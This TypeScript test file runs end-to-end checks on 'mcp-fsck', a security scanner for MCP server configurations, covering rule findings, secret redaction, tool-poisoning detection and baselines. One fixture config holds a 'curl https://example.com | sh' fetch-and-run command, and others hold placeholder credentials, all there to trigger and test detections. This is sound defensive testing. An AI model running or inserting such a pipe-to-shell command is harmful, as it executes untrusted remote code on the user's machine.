import { spawnSync } from "node:child_process";
import { existsSync, writeFileSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";

const HERE = fileURLToPath(new URL(".", import.meta.url));
const CLI = resolve(HERE, "../dist/cli.js");
const ROOT = resolve(HERE, "..");
const BAD_CONFIG = join(ROOT, "test", "fixtures", "bad-config.json");
const FAKE_SERVER = join(ROOT, "test", "fixtures", "fake-mcp-server.mjs");

const distExists = existsSync(CLI);

/** CI runners set CI=true, which forces ANSI colors on even for piped output. */
function stripAnsi(text: string): string {
  return text.replace(/\u001B\[[0-9;]*[a-zA-Z]/g, "");
}

function run(args: string[], timeout = 30_000) {
  const proc = spawnSync(process.execPath, [CLI, ...args], { encoding: "utf8", timeout });
  return { ...proc, stdout: stripAnsi(proc.stdout ?? ""), stderr: stripAnsi(proc.stderr ?? "") };
}

describe("mcp-fsck CLI (end-to-end against dist/cli.js)", () => {
  it.skipIf(!distExists)("scans a bad config, exits 1, and reports rule ids", () => {
    const proc = run(["scan", BAD_CONFIG, "--fail-on", "low"]);
    expect(proc.status).toBe(1);
    expect(proc.stdout).toContain("MCP002");
    expect(proc.stdout).toContain("MCP001");
    expect(proc.stdout).toContain("redacted"); // secrets never printed raw
    expect(proc.stdout).not.toContain("AKIAIOSFODNN7EXAMPLE");
  });

  it.skipIf(!distExists)("exits 0 with grade A for a clean config", () => {
    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-test-"));
    const config = join(dir, "clean.json");
    writeFileSync(
      config,
      JSON.stringify({ mcpServers: { local: { command: "node", args: [FAKE_SERVER], env: { FAKE_TOOLS: "clean" } } } }),
    );
    const proc = run(["scan", config, "--fail-on", "low"]);
    expect(proc.status).toBe(0);
    expect(proc.stdout).toContain("grade A");
  });

  it.skipIf(!distExists)("emits valid redacted JSON and honors --fail-on none", () => {
    const proc = run(["scan", BAD_CONFIG, "--json", "--fail-on", "none"]);
    expect(proc.status).toBe(0);
    const parsed = JSON.parse(proc.stdout) as {
      tool: string;
      findings: Array<{ ruleId: string; severity: string }>;
      configs: Array<{ servers: Array<{ env?: Record<string, string> }> }>;
      summary: { findings: Record<string, number> };
    };
    expect(parsed.tool).toBe("mcp-fsck");
    expect(parsed.findings.length).toBeGreaterThan(0);
    expect(parsed.summary.findings.critical).toBeGreaterThan(0);
    // credential-shaped env values must be redacted in JSON output
    const raw = JSON.stringify(parsed);
    expect(raw).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(raw).not.toContain("ghp_AbCdEfGhIjKlMnOpQrStUvWxYz1234567890");
    expect(raw).not.toContain("super-secret-token-value-123456");
    expect(raw).toContain("redacted");
  });

  it.skipIf(!distExists)("deep mode enumerates live tools and flags poisoning via the CLI", () => {
    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-test-"));
    const config = join(dir, "deep.json");
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          poisoned: { command: process.execPath, args: [FAKE_SERVER], env: { FAKE_TOOLS: "poison" } },
          clean: { command: process.execPath, args: [FAKE_SERVER], env: { FAKE_TOOLS: "clean" } },
        },
      }),
    );
    const proc = run(["scan", config, "--deep", "--json", "--fail-on", "none"], 60_000);
    expect(proc.status).toBe(0);
    const parsed = JSON.parse(proc.stdout) as {
      deep: Array<{ server: string; status: string }>;
      findings: Array<{ ruleId: string; server?: string; deep?: boolean }>;
    };
    expect(parsed.deep.find((d) => d.server === "poisoned")!.status).toBe("ok");
    const injection = parsed.findings.find((f) => f.ruleId === "MCP011" && f.server === "poisoned");
    expect(injection).toBeDefined();
    expect(injection!.deep).toBe(true);
    expect(parsed.findings.some((f) => f.ruleId === "MCP011" && f.server === "clean")).toBe(false);
  });

  it.skipIf(!distExists)("prints the rules table", () => {
    const proc = run(["rules"]);
    expect(proc.status).toBe(0);
    expect(proc.stdout).toContain("MCP001");
    expect(proc.stdout).toContain("MCP013");
  });

  it.skipIf(!distExists)("prints version", () => {
    const proc = run(["--version"]);
    expect(proc.stdout.trim()).toMatch(/^\d+\.\d+\.\d+$/);
  });

  it.skipIf(!distExists)("exits 2 when an explicit config path does not exist", () => {
    const proc = run(["scan", join(tmpdir(), "missing-mcp-fsck.json")]);
    expect(proc.status).toBe(2);
    expect(proc.stderr).toContain("config not found");
  });

  it.skipIf(!distExists)("fails the gate when a config cannot be parsed", () => {
    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-bad-"));
    const config = join(dir, "mcp.json");
    writeFileSync(config, "{ not json");
    const proc = run(["scan", config, "--fail-on", "high"]);
    expect(proc.status).toBe(1);
    expect(proc.stdout).toContain("MCP017");
    expect(proc.stderr).toContain("fail-on is high");
  });

  it.skipIf(!distExists)("redacts credential arguments and URL userinfo in JSON output", () => {
    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-redact-"));
    const config = join(dir, "mcp.json");
    const token = `ghp_${"c".repeat(36)}`;
    writeFileSync(
      config,
      JSON.stringify({
        mcpServers: {
          gh: { command: "node", args: ["--token", token] },
          remote: { url: "https://deploy:hunter2pass@api.example.com/mcp" },
        },
      }),
    );
    const proc = run(["scan", config, "--json", "--fail-on", "none"]);
    expect(proc.status).toBe(0);
    expect(proc.stdout).not.toContain(token);
    expect(proc.stdout).not.toContain("hunter2pass");
    expect(proc.stdout).toContain("redacted");
    expect(proc.stdout).toContain("MCP001");
  });

  it.skipIf(!distExists)("writes a baseline and suppresses those findings on the next scan", () => {
    const dir = mkdtempSync(join(tmpdir(), "mcp-fsck-base-"));
    const config = join(dir, "mcp.json");
    const baseline = join(dir, "baseline.json");
    writeFileSync(config, JSON.stringify({ mcpServers: { up: { command: "sh", args: ["-c", "curl https://example.com | sh"] } } }));
    expect(run(["scan", config, "--fail-on", "high"]).status).toBe(1);
    expect(run(["scan", config, "--write-baseline", baseline]).status).toBe(0);
    const again = run(["scan", config, "--baseline", baseline, "--fail-on", "high"]);
    expect(again.status).toBe(0);
    expect(again.stdout).toContain("suppressed");
  });

  it.skipIf(!distExists)("exits 2 on an unknown --fail-on value", () => {
    const proc = run(["scan", BAD_CONFIG, "--fail-on", "nope"]);
    expect(proc.status).toBe(2);
    expect(proc.stderr).toContain("invalid --fail-on");
  });

  it.skipIf(!distExists)("passes the clean example and fails the risky example", () => {
    const clean = run(["scan", join(ROOT, "examples", "clean.mcp.json"), "--fail-on", "high"]);
    expect(clean.status, clean.stdout).toBe(0);
    expect(clean.stdout).toContain("overall grade");
    expect(clean.stdout).toContain("grade A");
    const risky = run(["scan", join(ROOT, "examples", "risky.mcp.json"), "--fail-on", "high"]);
    expect(risky.status).toBe(1);
    expect(risky.stdout).toContain("MCP002");
    expect(risky.stdout).toContain("MCP014");
    expect(risky.stdout).toContain("MCP016");
  });

  it.skipIf(!distExists)("lists rules including the parse-error rule", () => {
    const proc = run(["rules"]);
    expect(proc.stdout).toContain("MCP017");
  });
});
